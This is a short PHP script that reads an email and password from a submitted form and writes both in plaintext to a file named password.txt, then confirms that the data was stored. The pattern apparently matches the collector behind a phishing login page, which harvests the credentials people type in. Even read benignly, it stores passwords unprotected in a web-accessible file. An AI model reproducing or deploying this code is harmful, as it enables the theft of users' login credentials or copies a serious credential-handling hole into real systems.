<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["pass"];
    
    // Open the text file for writing
    $file = fopen("password.txt", "w");

    if ($file) {
        // Write the user input to the file
        fwrite($file, "Email: " . $email . "\n");
        fwrite($file, "Password: " . $password . "\n");
        
        // Close the file
        fclose($file);
        
        echo "Data has been stored in password.txt.";
    } else {
        echo "Failed to open the file for writing.";
    }
}
?>
